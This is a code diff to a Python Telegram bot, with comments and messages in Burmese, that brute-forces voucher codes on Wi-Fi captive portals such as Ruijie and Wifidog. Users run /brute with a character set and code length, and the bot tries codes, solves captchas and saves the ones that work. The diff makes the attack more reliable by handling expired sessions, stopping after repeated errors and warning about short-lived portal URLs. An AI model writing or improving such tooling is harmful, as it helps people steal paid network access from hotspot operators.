@@ -502,7 +502,8 @@ async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False,
         ) as task_session:
             session_id = await get_session_id(task_session, session_url)
             if not session_id:
-                continue
+                # ⭐ ဒီနေရာမှာ session_id မရရင် ERROR ပြန်ပေးလိုက်မယ်
+                return "ERROR_NO_SESSION"
 
             auth_code = None
             for _ in range(CAPTCHA_RETRY):
@@ -671,6 +672,7 @@ async def run_bruteforce(mode, length, chat_id, session_url, scan_id, target=Non
     found = 0
     scan_start = time.monotonic()
     last_progress_update = 0
+    error_count = 0  # ⭐ Error ရေတွက်ဖို့
 
     global _voucher_sem
     if _voucher_sem is None:
@@ -700,7 +702,21 @@ async def run_bruteforce(mode, length, chat_id, session_url, scan_id, target=Non
             results = await asyncio.gather(*[_check(code) for code in batch], return_exceptions=True)
 
             for res in results:
-                if res:
+                # ⭐ Session မရလို့ Error တက်ရင် ရေတွက်မယ်
+                if res == "ERROR_NO_SESSION":
+                    error_count += 1
+                    if error_count >= 50:  # ၅၀ ခါဆက်တိုက် Error တက်ရင် ရပ်မယ်
+                        await _safe_edit(
+                            chat_id, progress_msg.message_id, 
+                            "❌ **URL မှားယွင်းနေပါသည် သို့မဟုတ် သက်တမ်းကုန်နေပါသည်။**\n"
+                            "သင်ပေးပို့လိုက်သော Wifidog URL ကို အသုံးပြု၍ မရပါ။\n"
+                            "Browser မှ `index.html?sessionId=...` ပါသော Portal Link အသစ်ကို ယူပြီး /setup ပြန်လုပ်ပေးပါ။",
+                            parse_mode="Markdown"
+                        )
+                        scan_tasks.pop(chat_id, None)
+                        return
+                elif res:
+                    error_count = 0  # အောင်မြင်ရင် Error ရေတွက်တာ ပြန်သုညချမယ်
                     found += 1
                     if target and found >= target:
                         await progress_msg.edit_text("🎯 Target reached!")
@@ -762,23 +778,15 @@ async def help_cmd(message):
     help_text = (
         "📚 **Command လမ်းညွှန်**\n\n"
         "၁။ **Setup**:\n"
-        "   /setup <url>\n"
-        "   (portal-mm-as သို့မဟုတ် portal-as URL)\n\n"
+        "   /setup <url>\n\n"
         "၂။ **ရှာဖွေခြင်း**:\n"
-        "   /brute <mode> <length> [target]\n"
-        "   Mode:\n"
-        "     1 = ဂဏန်းသီးသန့် (0-9)\n"
-        "     2 = အင်္ဂလိပ်စာလုံးအသေး (a-z)\n"
-        "     3 = အင်္ဂလိပ်စာလုံးအကြီး (A-Z)\n"
-        "     4 = စာလုံးအကြီး+အသေး (a-zA-Z)\n"
-        "     5 = စာလုံး+ဂဏန်း (a-z, 0-9)\n"
-        "   ဥပမာ: /brute 1 6 5\n\n"
+        "   /brute <mode> <length> [target]\n\n"
         "၃။ /status  – အခြေအနေကြည့်\n"
         "၄။ /stop    – ရပ်တန့်ခြင်း\n"
         "၅။ /resume  – ဆက်ရှာဖွေခြင်း\n"
         "၆။ /saved   – ရလဒ်ကြည့်ခြင်း\n"
         "၇။ /delete_saved – ရလဒ်ဖျက်ခြင်း\n"
-        "၈။ /recheck – Success codes ပြန်စစ်ခြင်း (expired auto-remove)\n"
+        "၈။ /recheck – Success codes ပြန်စစ်ခြင်း\n"
         "၉။ /notify  – Notification ON/OFF"
     )
     await bot.reply_to(message, help_text, parse_mode="Markdown")
@@ -787,10 +795,14 @@ async def help_cmd(message):
 async def handle_setup(message):
     args = message.text.split(maxsplit=1)
     if len(args) < 2:
-        await bot.reply_to(message, "အသုံးပြုနည်း:\n/setup your_session_url\n\nဥပမာ:\nhttps://portal-mm-as.ruijienetworks.com/...")
+        await bot.reply_to(message, "အသုံးပြုနည်း:\n/setup your_session_url")
         return
     url = args[1]
     await bot.reply_to(message, "Session URL စစ်ဆေးနေပါသည်...")
+    
+    if "wifidog" in url:
+        await bot.reply_to(message, "⚠️ သတိပေးချက် - သင်ပေးပို့လိုက်တာက Wifidog URL ဖြစ်ပါတယ်။ ဒါကို အသုံးပြုလို့ ရနိုင်ပေမဲ့ ခဏနေရင် Expire ဖြစ်တတ်ပါတယ်။ အကောင်းဆုံးကတော့ index.html?sessionId=... ပါတဲ့ Link ကို သုံးတာပါ။")
+
     if await check_session_url(url):
         cid = message.chat.id
         portal_config, portal_name = get_portal_config(url)
@@ -819,14 +831,8 @@ async def brute(message):
         await bot.reply_to(message,
             "အသုံးပြုနည်း:\n"
             "/brute <mode> <length> [target]\n\n"
-            "Mode:\n"
-            "  1 = ဂဏန်းသီးသန့် (0-9)\n"
-            "  2 = အင်္ဂလိပ်စာလုံးအသေး (a-z)\n"
-            "  3 = အင်္ဂလိပ်စာလုံးအကြီး (A-Z)\n"
-            "  4 = စာလုံးအကြီး+အသေး (a-zA-Z)\n"
-            "  5 = စာလုံး+ဂဏန်း (a-z, 0-9)\n\n"
-            "ဥပမာ:\n"
-            "/brute 1 6 5\n/brute 2 6\n/brute 5 8 10"
+            "Mode:\n  1 = ဂဏန်းသီးသန့် (0-9)\n  2 = a-z\n  3 = A-Z\n  4 = a-zA-Z\n  5 = a-z, 0-9\n\n"
+            "ဥပမာ:\n/brute 1 6 5\n/brute 2 6"
         )
         return
 
@@ -1152,7 +1158,6 @@ async def main():
     try:
         asyncio.create_task(web_server())
         asyncio.create_task(github_update_scheduler())
-        # ❌ session_recheck_scheduler() ကို ဒီနေရာမှာ ဖြုတ်ပစ်ထားပါတယ် ❌
         await start_polling()
     finally:
         await session.close()
